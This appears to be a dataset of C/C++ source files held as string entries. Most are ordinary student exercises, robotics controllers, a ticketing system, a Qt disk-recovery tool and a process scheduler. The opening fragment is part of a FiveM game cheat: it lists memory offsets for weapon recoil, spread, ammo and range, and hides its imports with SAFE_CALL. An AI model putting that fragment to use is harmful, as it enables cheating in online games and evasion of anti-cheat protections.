= 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2545_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0 + 0x50;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2612_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GTAProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2699_GameProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x1530;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GameProcess.exe\") || SAFE_CALL(GetModuleHandleA)(\"FiveM_b2189_GTAProcess.exe\"))\r\n\t\t{\r\n\t\t\tFiveM::EntityType = 0x10B8;\r\n\t\t\tFiveM::Armor = 0x14E0;\r\n\r\n\t\t\tFiveM::WeaponManager = 0x10D8;\r\n\t\t\tFiveM::PlayerInfo = 0x10C8;\r\n\t\t\tFiveM::Recoil = 0x2F4;\r\n\t\t\tFiveM::Spread = 0x84;\r\n\t\t\tFiveM::ReloadMultiplier = 0x134;\r\n\t\t\tFiveM::AmmoType = 0x20;\r\n\t\t\tFiveM::AmmoExplosiveType = 0x24;\r\n\t\t\tFiveM::WeaponName = 0x5F0;\r\n\t\t\tFiveM::IsInAVehicule = 0x146B;\r\n\t\t\tFiveM::Range = 0x28C;\r\n\r\n\r\n\t\t}\r\n\t\tif (SAFE_CALL(GetModuleHandleA)(\"FiveM_b2372_GamePr",
    "#include <iostream>\n\nusing namespace std;\n\nstruct Linklist\n{\n    int data;\n\n    Linklist *next;\n\n\n\n};\nLinklist *Head ;\n\nLinklist *curr;\n\nvoid traversal()\n{\n\n   curr = Head;\n\n   while(curr!= nullptr)\n   {\n       cout << curr -> data << endl;\n\n       curr = curr-> next;\n   }\n}\n\n\nvoid insertion(Linklist *node)\n{\n\n    cout << \"Select : \" << endl;\n\n    int Select;\n\n    cout << \"1.insert at Head.\" << endl;\n    cout << \"2.Insert  at middle. \" << endl;\n    cout << \"3.Insert at last.\" << endl;\n\n    cin >> Select;\n\n\n        if(Select == 1)\n        {\n            cout << \"Enter the value : \";\n\n            cin >> node->data;\n\n            node->next = Head;\n\n            Head = node;\n\n\n        }\n\n\n\n\n\n        else if(Select == 2)\n        {\n            int value;\n\n        cout << \"Enter the  value you want to insert before it : \" ;\n\n        cin >> value;\n\n        curr = Head;\n\n        while(curr!= nullptr)\n        {\n            if(value = curr->data)\n        {\n            break;\n        }\n\n            curr = curr-> next;\n\n        }\n\n\n\n        cout << \"Enter the value want to insert : \" ;\n\n        cin >> node->data;\n\n        node->next= curr->next;\n\n        curr->next = node;\n\n\n\n\n\n\n        }\n\n\n\n\n\n        else if(Select == 3)\n        {\n            cout << \"Enter the value want to insert : \" ;\n\n        cin >> node->data;\n\n\n        curr = Head;\n\n        while(curr!= nullptr)\n        {\n            if(curr -> next == nullptr)\n        {\n            break;\n        }\n\n            curr = curr-> next;\n\n        }\n\n\n\n        curr->next = node;\n\n        node->next = nullptr;\n\n         cout << node << endl;\n\n\n        }\n\n\n\n\n\n\n\n    }\n\n\n    void searching(int value)\n    {\n        curr = Head;\n\n   while(curr!= nullptr)\n   {\n\n       if(curr-> data  == value)\n       {\n           cout << \"found\" << endl;\n           break;\n       }\n\n       curr = curr-> next;\n   }\n    }\n\n\n\n    void Deletion(int value)\n    {\n\n        curr = Head;\n\n        while (curr != nullptr)\n        {\n            if(curr-> next-> data  == value)\n            {\n\n\n\n                Linklist *v = curr-> next;\n\n                curr->next = v-> next;\n\n\n\n\n                break;\n\n            }\n\n                curr = curr->next;\n\n        }\n\n\n\n    }\n\n\nint main()\n{\n    Linklist node1,node2,node3,node4,node5 ;\n\n    Head = &node1;\n\n    node1.data = 10;\n    node2.data = 20;\n    node3.data = 30;\n    node4.data = 40;\n    node5.data = 50;\n\n\n    node1.next = &node2;\n    node2.next = &node3;\n    node3.next = &node4;\n    node4.next = &node5;\n    node5.next = nullptr;\n\n   cout << \"Linklist Operations : - \" << endl;\n\n   traversal();\n\n   Linklist node6;\n\n   cout << &node6 <<endl;\n\n   insertion(&node6);\n   traversal();\n   searching(50);\n\n   cout << \"Enter the data you want to remove : \" ;\n\n   int data;\n\n   cin >> data;\n\n   Deletion(data);\n\n   traversal();\n\n\n\n\n\n\n\n\n\n    return 0;\n}\n",
    "#include <iostream>\n#include <iomanip>\n#include <string>\n#include <ctime>\n#include <windows.h>\n#include <stdlib.h>\n\n#define ROWS 14\n#define COLS 20\n#define REG_PRICE 75.0\n#define EXC_PRICE 125.0\n#define VIP_PRICE 250.0\n\nusing namespace std;\n\n\nstruct ticketType\n{\n    string seat = \"\\0\";\n    int seatArray[2] = { 0 };\n    double price = 0.0;\n    int serialNum = 0;\n};\n\nstruct userType\n{\n    string username;\n    string password;\n    int ticket_bought[280] = { 0 };\n    int ticket_quantity = 0;\n};\n\nticketType Ticket[280];\nuserType User[280];\n\nvoid signup(userType[], int&);\nbool login(userType[], int, int&);\nbool signup_login(userType[], int&, int&);\nvoid displayMenu();\nvoid initialSeats(string[][COLS]);\nvoid displaySeats(string[][COLS]);\nvoid displayAbout();\nvoid genSerialNum(ticketType[], int, userType[], int);\nvoid bookSeats(string[][COLS], int&, int&, double&, ticketType[], bool&, int&, int&, int&, int&, int&, int&, userType[], int);\nvoid DisplayPrice();\nchar confirm_payment(double);\nbool card();\nbool onlineBanking(double, double&, double&, double&);\nbool eWallet(double, double&, double&, double&);\nbool paymentStatus(double, double&, double&, double&, double&, double&, double&);\nvoid recoverSeats(ticketType[], int&, int, string[][COLS], int&, int&, int&, int, int, int, userType[], int);\nvoid displayTicket(ticketType[], int);\nvoid check_serialNum(ticketType[]);\nvoid check_user(userType[], ticketType[]);\nvoid checkTicket(userType[], ticketType[]);\nvoid getFeedback(string[], int&);\nvoid printFeedback(string[], int&);\nbool AdminLogin();\nvoid displayStaffMenu();\nbool CancelConcert();\nbool suspendTicketing();\nbool reactivateTicketing();\nvoid salesReport(int, double, int, int, int);\nvoid staffMenu(bool&, bool&, string[], int&, int, double, int, int, int);\n\n\n\n\nint main() {\n    char letter;\n    int total_seatCount = 0, totalVipSeat = 0, totalExcSeat = 0, totalRegSeat = 0, feedbackCount = 0, userCount = 0;\n    double total_revenue = 0, bank_balance1 = 5000.00, bank_balance2 = 5000.00, bank_balance3 = 5000.00, eWallet_balance1 = 5000.00, eWallet_balance2 = 5000.00, eWallet_balance3 = 5000.00;\n    bool ticketSuspend = false, concertCancelled = false;\n\n    string seats[ROWS][COLS] = { \"\" }, feedback[280] = { \"\" };\n\n\n    initialSeats(seats);\n\n    do { //let the system keep looping\n        int temp_seatCount = 0;\n        double total_price = 0;\n        int temp_VipSeat = 0, temp_ExcSeat = 0, temp_RegSeat = 0;\n        int current_user = 0;\n        bool bookStatus = false;\n\n        displayMenu();\n\n        cout << \"\\n\\nSelect option: \";\n        cin >> letter;\n\n        if (isupper(letter) != 0)\n        {\n            letter = static_cast<char>(tolower(letter));\n        }\n\n        switch (letter) {\n        case 'a':\n        {\n            if (total_seatCount == 280)\n            {\n                cout << \"All seats are fully booked.\" << endl;\n                cout << \"Press enter to continue......\" << endl;\n                cin.ignore();\n                cin.get();\n                break;\n            }\n            else if (ticketSuspend == true) {\n                cout << \"Ticketing process is currently suspended. We apologize for any inconvenience caused.\" << endl;\n                cout << \"Press enter to continue......\" << endl;\n                cin.ignore();\n                cin.get();\n                break;\n            }\n            else\n            {\n                if (signup_login(User, userCount, current_user) == false)\n                {\n                    break;\n                }\n\n\n                bookSeats(seats, total_seatCount, temp_seatCount, total_price, Ticket, bookStatus, totalVipSeat, totalExcSeat, totalRegSeat, temp_VipSeat, temp_ExcSeat, temp_RegSeat, User, current_user);\n\n                if (bookStatus == true)\n                {\n                    //proceed to payment part\n                    if (confirm_payment(total_price) == 'Y')\n                    {\n                        char confirmRetry;\n                        do\n                        {\n                            confirmRetry = '\\0';\n                            if (paymentStatus(total_price, bank_balance1, bank_balance2, bank_balance3, eWallet_balance1, eWallet_balance2, eWallet_balance3) == true)\n                            {\n                                system(\"cls\");\n                                cout << \"Payment Successful\" << endl;\n                                total_revenue += total_price;\n                                //displaying ticket\n                                for (int i = 1; i <= temp_seatCount; i++)\n                                {\n                                    cout << \"Ticket \" << i << endl;\n                                    displayTicket(Ticket, total_seatCount - i);\n                                    cout << \"\\n\\n\";\n                                }\n                                cout << \"Press enter to continue......\" << endl;\n                                cin.get();\n\n                            }\n                ",
    "#include <signal.h>\n#include <geometry_msgs/PointStamped.h>\n#include <sensor_msgs/Imu.h>\n#include <nav_msgs/Odometry.h>\n#include <rosgraph_msgs/Clock.h>\n#include <tf/transform_broadcaster.h>\n\n#include <webots_ros.h>\n\nros::NodeHandle *n;\n\nconst int TIME_STEP = 32;                 \nconst int NMOTORS = 2;                      \nconst float MAX_SPEED = 2.0;                \nconst std::string ROBOT_NAME = \"robot/\";    \n\nstatic int controllerCount;\nstatic std::vector<std::string> controllerList; \n\nros::Publisher odompub;                  \n\ndouble GPSvalues[4];                      \nint gps_flag=1;                         \ndouble Inertialvalues[4];                 \ndouble liner_speed=0,angular_speed=0;      \n\nWebots w = Webots(TIME_STEP,ROBOT_NAME);\n\nvoid controllerNameCallback(const std_msgs::String::ConstPtr &name) { \n    controllerCount++; \n    controllerList.push_back(name->data);\n    ROS_INFO(\"Controller #%d: %s.\", controllerCount, controllerList.back().c_str());\n}\n\nvoid quit(int sig) {\n    w.Quit(n);\n}\n\nvoid broadcastTransform(){\n    static tf::TransformBroadcaster br;\n    tf::Transform transform;\n    transform.setOrigin(tf::Vector3(GPSvalues[0]-GPSvalues[2],GPSvalues[1]-GPSvalues[3],0));\n    tf::Quaternion q(Inertialvalues[0],Inertialvalues[2],Inertialvalues[1],-Inertialvalues[3]);\n    transform.setRotation(q);\n    br.sendTransform(tf::StampedTransform(transform,ros::Time::now(),\"odom\",\"base_link\"));\n    transform.setIdentity();\n    br.sendTransform(tf::StampedTransform(transform, ros::Time::now(), \"base_link\", \"robot/Sick_LMS_291\"));\n}\n\n// Send odom data to the internal Cartographer calcuuulation node.\nvoid send_odom_data() {\n    nav_msgs::Odometry odom;\n    odom.header.frame_id = \"odom\";\n    odom.child_frame_id = \"base_link\";\n    odom.header.stamp = ros::Time::now();\n    odom.pose.pose.position.x = GPSvalues[0]-GPSvalues[2];\n    odom.pose.pose.position.y = GPSvalues[1]-GPSvalues[3];\n    odom.pose.pose.position.z = 0;\n\n    odom.pose.pose.orientation.x = Inertialvalues[0];\n    odom.pose.pose.orientation.y = Inertialvalues[2];\n    odom.pose.pose.orientation.z = Inertialvalues[1];\n    odom.pose.pose.orientation.w = -Inertialvalues[3];\n\n    odom.twist.twist.linear.x = liner_speed;\n    odom.twist.twist.angular.z = angular_speed;\n\n    odompub.publish(odom);\n}\n\nvoid gpsCallback(const geometry_msgs::PointStamped::ConstPtr &value){\n    GPSvalues[0] = value->point.x;\n    GPSvalues[1] = value->point.z;\n    if (gps_flag){\n        GPSvalues[2] = value->point.x;\n        GPSvalues[3] = value->point.z;\n        gps_flag=0;\n    }\n    broadcastTransform();  \n}\n\nvoid inertial_unitCallback(const sensor_msgs::Imu::ConstPtr &values){\n    Inertialvalues[0] = values->orientation.x;\n    Inertialvalues[1] = values->orientation.y;\n    Inertialvalues[2] = values->orientation.z;\n    Inertialvalues[3] = values->orientation.w;\n    broadcastTransform();\n}\n\n// after we get vel data from the keyboard node, we can utilize it for generating the odom data\n// which is send to the internal cartographer node then.\nvoid velCallback(const nav_msgs::Odometry::ConstPtr &value){\n    liner_speed = value->twist.twist.linear.x;\n    angular_speed = value->twist.twist.angular.z;\n    send_odom_data();\n}\n\n\nint main(int argc, char **argv) {\n    setlocale(LC_ALL, \"zh_CN.utf8\"); \n    std::string controllerName;\n    ros::init(argc, argv, \"robot_init\", ros::init_options::AnonymousName);\n    n = new ros::NodeHandle;\n\n    signal(SIGINT, quit);\n\n    ros::Subscriber nameSub = n->subscribe(\"model_name\", 100, controllerNameCallback);\n    w.Init(n, nameSub, controllerCount, controllerList);\n\n    if(w.EnableService(n, \"Sick_LMS_291\")) return 1;\n\n    ros::Subscriber gps_sub;\n    if(!w.EnableService(n, \"gps\")){\n        gps_sub = n->subscribe(std::string(ROBOT_NAME)+std::string(\"gps/values\"), 1, gpsCallback);\n        ROS_INFO(\"Topic for gps initialized.\");\n        while (gps_sub.getNumPublishers() == 0) {}\n        ROS_INFO(\"Topic for gps connected.\");\n    }else return 1;\n    \n    ros::Subscriber inertial_unit_sub;\n    if(!w.EnableService(n, \"inertial_unit\")){\n        inertial_unit_sub = n->subscribe(std::string(ROBOT_NAME)+std::string(\"inertial_unit/quaternion\"), 1, inertial_unitCallback);\n        ROS_INFO(\"Topic for inertial_unit initialized.\");\n        while (inertial_unit_sub.getNumPublishers() == 0) {}\n        ROS_INFO(\"Topic for inertial_unit connected.\");\n    }else return 1;\n\n    ros::Subscriber sub_speed;\n    sub_speed = n->subscribe(\"/vel\", 1, velCallback);\n    odompub = n->advertise<nav_msgs::Odometry>(\"robot/odom\",10);\n\n    while (ros::ok()) {\n        if (w.ChecktimeStep())break;\n        ros::spinOnce();\n    }\n    \n    w.Quit(n); \n    return 0;\n}\n\n",
    "#include<iostream>\r\nusing namespace std;\r\nstruct node{\r\n\tint prn;\r\n\tchar name[20];\r\n\tstruct node *next;\r\n};\r\nclass Pinnacle{\r\n\tpublic:struct node *start;\r\n\tPinnacle(){\r\n\t\tstart=NULL;\r\n\t}\r\n\tvoid insert();\r\n\tvoid del();\r\n\tvoid display();\r\n\tint total();\r\n\tvoid reverse(struct node*);\r\n\tvoid concat(Pinnacle);\r\n};\r\nvoid Pinnacle:: insert(){\r\n\tcout<<\"Press:\\n1.to insert in beginning\\n2.to insert in end\\n3.toinsert in middle\\n\";\r\n\tint ch;\r\n\tcin>>ch;\r\n\tstruct node *temp;\t\t\r\n\ttemp=new node[sizeof(node)];\r\n\tstruct node *ptr=start;\r\n\tswitch(ch){\r\n\tcase 1:cout<<\"Enter name of president:\\n\";\r\n\t\tcin>>temp->name;\r\n\t\tcout<<\"Enter PRN of President:\\n\";\r\n\t\tcin>>temp->prn;\r\n\t\tif(start==NULL)\r\n\t\tstart=temp;\r\n\t\telse{\r\n\t\ttemp->next=start;\r\n\t\tstart=temp;\r\n\t\t}\r\n\t\tbreak;\r\n\tcase 2:cout<<\"Enter name of secretarty:\\n\";\r\n\t\tcin>>temp->name;\r\n\t\tcout<<\"Enter PRN of secretary:\\n\";\r\n\t\tcin>>temp->prn;\r\n\t\twhile(ptr->next!=NULL)\r\n\t\tptr=ptr->next;\r\n\t\tptr->next=temp;\r\n\t\ttemp->next=NULL;\r\n\t\tbreak;\r\n\tcase 3:cout<<\"Enter name of Member:\\n\";\r\n\t\tcin>>temp->name;\r\n\t\tcout<<\"Enter PRN of Member:\\n\";\r\n\t\tcin>>temp->prn;\r\n\t\ttemp->next=start->next;\r\n\t\tstart->next=temp;\r\n\t\tbreak;\r\n\t\tdefault:cout<<\"Wrong input\\n\";\r\n\t}\r\n}\r\nvoid Pinnacle:: del(){\r\n\tstruct node *ptr=start;\r\n\tstruct node *temp;\r\n\tif(start==NULL)\r\n\t\tcout<<\"Empty list\";\r\n\telse{\r\n\t\tcout<<\"Enter the PRN no. of the member whose entry is to be deleted:\\n\";\r\n\t\tint k;\r\n\t\tcin>>k;\r\n\t\twhile(ptr!=NULL){\r\n\t\t\tif(ptr->prn==k){\r\n\t\t\t\tif(ptr==start)\r\n\t\t\t\t\t\tstart=ptr;\r\n\t\t\t\telse if(ptr->next==NULL)\r\n\t\t\t\t\t\ttemp->next=NULL;\t\t\t\t\t\t\r\n\t\t\t\telse\r\n\t\t\t\t\ttemp->next=ptr->next;\r\n\t\t\t\tcout<<\"Entry succesfully deleted.\\n\";\r\n\t\t\t\ttemp=ptr;\r\n\t\t\t\tptr=ptr->next;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\nint Pinnacle:: total(){\r\n\tint k=0;\r\n\tstruct node* ptr=start;\r\n\twhile(ptr!=NULL){\r\n\t\tk++;\r\n\t\tptr=ptr->next;\r\n\t}\r\n\treturn k;\r\n}\r\nvoid Pinnacle:: concat(Pinnacle q){\r\n\tstruct node* ptr=start;\r\n\twhile(ptr->next!=NULL){\r\n\t\tptr=ptr->next;\r\n\t}\r\n\tptr->next=q.start;\r\n}\r\nvoid Pinnacle:: display(){\r\n\tstruct node *ptr=start;\r\n\tcout<<\"The Details of Students are:\\n\";\r\n\tint k=1;\r\n\twhile(ptr!=NULL){\r\n\t\tcout<<k<<\".Name:\"<<ptr->name<<\"\\n PNR: \"<<ptr->prn<<\"\\n\";\r\n\t\tk++;\r\n\t\tptr=ptr->next;\r\n\t}\r\n}\r\nint main(){\r\n\tPinnacle p,q;\r\n\tchar in='y';\r\n\twhile(in=='y'||in=='Y'){\r\n\t\tcout<<\"Press\\n1)Add and delete the members as well as president or even secretary.\\n2)Compute total number of members of club\\n\";\r\n\t\tcout<<\"3)Display members\\n4)Two linked lists exists for two divisions.Concatenate two lists\\n\";\r\n\t\tint ch;\r\n\t\tcin>>ch;\r\n\t\tswitch(ch){\r\n\t\tcase 1:\r\n\t\t\tcout<<\"Press\\n1.to insert\\n2.to delete\\n\";\r\n\t\t\tint k,m;\r\n\t\t\tcin>>k;\r\n\t\t\tswitch(k){\r\n\t\t\t\tcase 1:cout<<\"Enter no. of data to be entered:\\n\";\r\n\t\t\t\tcin>>m;\r\n\t\t\t\tfor(int i=1;i<=m;i++)\r\n\t\t\t\t\tp.insert();\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:p.del();\r\n\t\t\t\tbreak;\r\n\t\t\tdefault:cout<<\"Wrong input.\";\r\n\t\t\t}\r\n\t\tbreak;\r\n\t\tcase 2:cout<<\"Total number of entries are:\"<<p.total()<<\"\\n\";\r\n\t\t\tbreak;\r\n\t\tcase 3:p.display();\r\n\t\t\tbreak;\r\n\t\tcase 4:cout<<\"Enter no. of entries in second list:\\n\";\r\n\t\t\tint f;\r\n\t\t\tcin>>f;\r\n\t\t\tfor(int i=1;i<=f;i++)\r\n\t\t\t\tq.insert();\r\n\t\t\t\tp.concat(q);\r\n\t\t\t\tcout<<\"List sucessfully concatenated\";\r\n\t\t\t\tbreak;\r\n\t\tdefault:cout<<\"wrong input\";\r\n\t\t}\r\n\t\tcout<<\"\\ndo you want to continue?(y/n)\";\r\n\t\tcin>>in;\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n\n// Original code\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    listWidget = new QListWidget(this);\n    setCentralWidget(listWidget);\n\n    process = new QProcess(this);\n    connect(process, SIGNAL(readyReadStandardOutput()), this, SLOT(runCommand()));\n    process->start(\"sudo\", QStringList() << \"fdisk\" << \"-l\");\n\n    QPushButton *selectOutputButton = new QPushButton(\"Select Output Path\", this);\n    connect(selectOutputButton, &QPushButton::clicked, this, &MainWindow::selectOutputPath);\n\n    recoverButton = new QPushButton(\"Recover Data\", this);\n    connect(recoverButton, &QPushButton::clicked, this, &MainWindow::startRecovery);\n\n    cancelButton = new QPushButton(\"Cancel\", this);\n    cancelButton->setVisible(false); // Initially hide the cancel button\n    connect(cancelButton, &QPushButton::clicked, this, &MainWindow::cancelRecovery);\n\n    progressLabel = new QLabel(\"Recovery in progress...\", this);\n    progressLabel->setVisible(false);\n\n    progressBar = new QProgressBar(this);\n    progressBar->setRange(0, 0); // Set range to (0, 0) for an indeterminate progress bar\n    progressBar->setVisible(false);\n\n    // Create and set up the main layout\n    QVBoxLayout *mainLayout = new QVBoxLayout();\n\n    // Create the table widget\n    tableWidget = new QTableWidget(this);\n    tableWidget->setColumnCount(4); // Updated to 4 columns\n    QStringList headers = {\"Device\", \"Size\", \"Type\", \"Disk Model\"};\n    tableWidget->setHorizontalHeaderLabels(headers);\n    tableWidget->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);\n    tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows); // Ensure entire row is selected\n    tableWidget->setEditTriggers(QAbstractItemView::NoEditTriggers); // Make cells non-editable\n\n    // Add widgets to the main layout\n    mainLayout->addWidget(tableWidget);\n\n    // Create button widget and layout\n    QWidget *buttonWidget = new QWidget(this);\n    QHBoxLayout *buttonLayout = new QHBoxLayout(buttonWidget);\n    buttonLayout->addWidget(selectOutputButton);\n    buttonLayout->addWidget(recoverButton);\n    buttonLayout->addWidget(cancelButton);\n    buttonWidget->setLayout(buttonLayout);\n\n    // Add button widget to the main layout\n    mainLayout->addWidget(buttonWidget);\n    mainLayout->addWidget(progressLabel);\n    mainLayout->addWidget(progressBar);\n\n    // Set the main layout to a central widget\n    QWidget *centralWidget = new QWidget(this);\n    centralWidget->setLayout(mainLayout);\n    setCentralWidget(centralWidget);\n\n    // Initialize timer\n    timer = new QTimer(this);\n    connect(timer, &QTimer::timeout, this, &MainWindow::updateProgressBar);\n\n    process->setProcessChannelMode(QProcess::MergedChannels);\n    connect(process, &QProcess::readyReadStandardOutput, this, &MainWindow::readProcessOutput);\n\n}\n\n\nMainWindow::~MainWindow()\n{\n    delete process;\n    delete tableWidget;\n}\n\nvoid MainWindow::runCommand()\n{\n    QString output = process->readAllStandardOutput();\n    QStringList lines = output.split(\"\\n\", Qt::SkipEmptyParts);\n    tableWidget->setRowCount(0); // Clear existing rows\n    QString currentDiskModel;\n\n    for (QString line : lines) { // Make a copy of the line to allow modifications\n        // Extract disk model\n        if (line.startsWith(\"Disk model:\")) {\n            currentDiskModel = line.section(\"Disk model:\", 1).trimmed();\n            continue;\n        }\n\n        if (line.startsWith(\"Disk /dev/\")) {\n            currentDiskModel.clear();\n        }\n\n        if (line.startsWith(\"/dev/\")) {\n            line.remove('*'); // Modify the copy of the line\n            qDebug() << \"--> \" << line;\n            QStringList fields;\n            for (const QString& field : line.split(\" \", Qt::SkipEmptyParts)) { // Use Qt::SkipEmptyParts to skip empty fields\n                fields.append(field);\n            }\n            if (fields.size() < 6) {\n                continue;\n            }\n            int row = tableWidget->rowCount();\n            tableWidget->insertRow(row);\n\n            // Insert Device\n            tableWidget->setItem(row, 0, new QTableWidgetItem(fields.at(0))); // Device\n\n            // Insert Size\n            QString size = fields.at(4); // Corrected index for Size\n            tableWidget->setItem(row, 1, new QTableWidgetItem(size)); // Size\n\n            // Insert Type\n            QString type;\n            for (int i = 5; i < fields.size(); ++i) {\n                // Check if the field is numeric\n                bool isNumeric = false;\n                for (QChar ch : fields.at(i)) {\n                    if (ch.isDigit()) {\n                        isNumeric = true;\n                        break;\n                    }\n                }\n                // If the field is not numeric, add it to the type\n                if (!isNumeric) {\n                    if (!type.isEmpty()) type += \" \"; // Add space between fields\n                ",
    "// Include necessary libraries for the Arduino board\n#include <Arduino.h>\n#include <ros.h>\n#include <geometry_msgs/Twist.h>\n#include <std_msgs/Float32.h>\n#include <std_msgs/Int16.h>\n#include <control_motors.h>\n#include <Encoder.h>\n#include <MPU6500_WE.h>\n#include <Wire.h>\n#define MPU6500_ADDR 0x68\n\n\nMPU6500_WE myMPU6500 = MPU6500_WE(MPU6500_ADDR);\n\nbool rotationflag = false;\nextern float theta_sp;\nfloat flagID;\n// Initialize ROS node handle\nros::NodeHandle nh;\n\nfloat angle_z = 0;\nlong prev_time = 0;\nlong prevT = 0;\n\nfloat desired_angle = 90;\n\n// Initialize ROS publisher\ngeometry_msgs::Twist cmd_vel_msg2;\nros::Publisher pub(\"/our_cmd_vel2\", &cmd_vel_msg2);\n\n\n\nvoid cmdVelCallback(const geometry_msgs::Twist& cmd_vel_msg) {\n\n  flagID = cmd_vel_msg.angular.x;\n\n  CMD_TO_RPM_REQ( (float) cmd_vel_msg.linear.x, (float) cmd_vel_msg.angular.z);  \n\n  int finger = (int) cmd_vel_msg.linear.z;\n  int colour = (int) cmd_vel_msg.linear.y;\n  if(finger == 1 || colour == 1){\n    theta_sp = angle_z;\n    \n    rotationflag = false;\n    CMD_TO_RPM_REQ(0.2, 0);\n\n  }\n  \n  else if(finger == 2 || colour == 2){\n    theta_sp = angle_z;\n    \n    rotationflag = false;\n    CMD_TO_RPM_REQ(-0.2, 0);\n  }\n  else if(finger == 3 || colour == 3){\n    desired_angle = angle_z + 90;\n    rotationflag = true;\n    CMD_TO_RPM_REQ(0, 0);\n   cmd_vel_msg2.angular.x = 1.0;\n   cmd_vel_msg2.linear.y = desired_angle;\n   cmd_vel_msg2.linear.z = angle_z; \n   pub.publish(&cmd_vel_msg2);\n  }\n  \n\n  \n}\n\n\nros::Subscriber<geometry_msgs::Twist> cmd_vel_sub(\"our_cmd_vel\", &cmdVelCallback);\n\n\nvoid setup(){\n\n  nh.getHardware()->setBaud(57600);\n\n  // Initialize ROS node\n  nh.initNode();\n  nh.advertise(pub);\n  nh.subscribe(cmd_vel_sub);\n \n  // Initialize the encoder, motors, and MPU6050\n\n  initialize_encoder();\n  intiate_motors();\n\n  Wire.begin();\n  myMPU6500.init();\n  myMPU6500.autoOffsets();\n  myMPU6500.enableGyrDLPF();\n  myMPU6500.setGyrDLPF(MPU6500_DLPF_6);\n  myMPU6500.setSampleRateDivider(5);\n  myMPU6500.setGyrRange(MPU6500_GYRO_RANGE_250);\n  myMPU6500.setAccRange(MPU6500_ACC_RANGE_2G);\n  myMPU6500.enableAccDLPF(true);\n  myMPU6500.setAccDLPF(MPU6500_DLPF_6);\n}\n\nvoid loop(){\n\n  cmd_vel_msg2.angular.x = 0.0;\n   cmd_vel_msg2.linear.y =  0.0;\n  long current_time = micros();\n  float dt = ((float) (current_time - prev_time)) / 1.e06;\n  prev_time = current_time; \n\n  xyzFloat gyr = myMPU6500.getGyrValues();\n  angle_z += gyr.z * dt;\n  cmd_vel_msg2.linear.z = (float) angle_z;\n  \n \n  \n\n\n  if(millis() - prevT > 100)\n  {\n    \n    pub.publish(&cmd_vel_msg2);\n    \n    prevT = millis();\n  }\n  \n \n  //CMD_TO_RPM_REQ(0.2, 0);\n  PID_control_motors();\n  angular_vel_func();\n  \n  // Spin ROS node\n  nh.spinOnce();\n}",
    "\ufeff#include <iostream>\n#include <list>\n#include <vector>\n#include <thread>\n#include <mutex>\n#include <condition_variable>\n#include <chrono>\n#include <cstring>\n#include <algorithm>\n#include <fstream>\n#include <sstream>\n\nusing namespace std;\nmutex mtx;\n\nstruct Process {\n    int pid;\n    int remainingTime;\n    int wakeupTime;\n    bool isForeground;\n    bool isPromoted;\n};\n\nstruct DQNode {\n    list<Process> processes;\n    DQNode* next;\n};\n\nclass DynamicQueue {\nprivate : \n    DQNode* bottom;\n    DQNode* top;\n    mutex mtx;\n    condition_variable cv;\n    int threshold;\n    int totalProcesses;\n    int currentProcesses;\n    int promotionIndex;\n\npublic : \n    DynamicQueue(int totalProcesses) : bottom(nullptr), top(nullptr), threshold(totalProcesses / 3), totalProcesses(totalProcesses), currentProcesses(0), promotionIndex(0) {}\n\n    void enqueue(Process p) {\n        lock_guard<mutex> lock(mtx);\n        if (p.isForeground) {\n            if (!top) {\n                top = new DQNode;\n                top->processes.push_back(p);\n                bottom = top;\n            }\n            else top->processes.push_back(p);\n        }\n        else {\n            if (!bottom) {\n                bottom = new DQNode;\n                bottom->processes.push_back(p);\n                top = bottom;\n            }\n            else  bottom->processes.push_back(p);\n        }\n        currentProcesses++;\n        cv.notify_one();\n        split_n_merge();\n    }\n\n    Process dequeue() {\n        unique_lock<mutex> lock(mtx);\n        while (top == nullptr) {\n            cv.wait(lock);\n        }\n        Process p = top->processes.front();\n        top->processes.pop_front();\n        if (top->processes.empty()) {\n            DQNode* temp = top;\n            top = top->next;\n            delete temp;\n        }\n        currentProcesses--;\n        promote();\n        return p;\n    }\n\n    void 